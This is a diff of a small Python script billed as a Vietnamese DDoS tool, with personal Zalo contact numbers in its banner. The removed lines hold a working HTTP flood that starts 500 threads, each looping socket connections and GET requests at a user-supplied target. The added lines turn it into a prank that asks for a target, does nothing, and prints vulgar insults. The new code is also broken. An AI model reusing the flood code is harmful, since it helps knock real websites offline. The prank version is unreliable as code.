@@ -7,43 +7,31 @@ import threading
 
 print("\n\n")
 print("         +-------------------------------------+")
-print("      TIEN DAT VUONG DEP CHAI NHAT THE GIOI")
+print("         |          Tools Tdvuong Demo)           |")
+print("         |  Koneuwuu - Sconio DDoS V1 (Demo) |")
+print("         |   Zalo: 0335102378 |")
+print("         |      Ddos Web Tầm Trung , VN Coder      |")
+print("         |            (Demo)            |")
+print("         |    Lưu Ý : Chỉ Dùng Cho Https ")
+print("         +---------------------------TDV-TdvuongDDoS------+ ")
 
 print("\n\n")
-
-print("Điền IP Tên Miền :  ")
-print("Điền IP TÊN MIỀN BẠN MUỐN DDOS DƯỚI ĐÂY - LION VERSION 1 (DEMO)'")
+print("Điền Tên Miền :  ")
+print("Điền URL :- '")
 target = input("\t == > ")
-print("ĐIỀN LẠI IP TÊN MIỀN BẠN MUỐN DDOS DƯỚI ĐÂY - LION VERSION 1 (DEMO)'  ")
+print("Điền Lại? : '  ")
 fake_ip = input("\t\t ==> ")
-print("NHẬP PORT NÊN CHỌN 443 - LION DDOS V1 (DEMO)")
+print("Port? : ")
 port = input("\t\t ==> ")
 
-port = int(port)
-
-attack_num = 0
-
-print("LION DDOS LOADING...")
+print("NGU LỒN ĐÉO CÓ DDOS ĐÂU 😁😁")
 
 def attack():
 
     while True:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((target, port))
-        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
-        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
-        
-        global attack_num
-        attack_num += 1
-        packesnum =attack_num
-        packesnum= str(packesnum)
-        print("LION DDOS V1 GG => "+packesnum)
+    
+        print("Có Cái Lồn kkk")
         print("Done")
         
         s.close()
-print("Zalo 0792161421 ")
-for i in range(500):
-    thread = threading.Thread(target=attack)
-    thread.start()
-
-
+print("CON CẶC DDOS CÁI L  ")
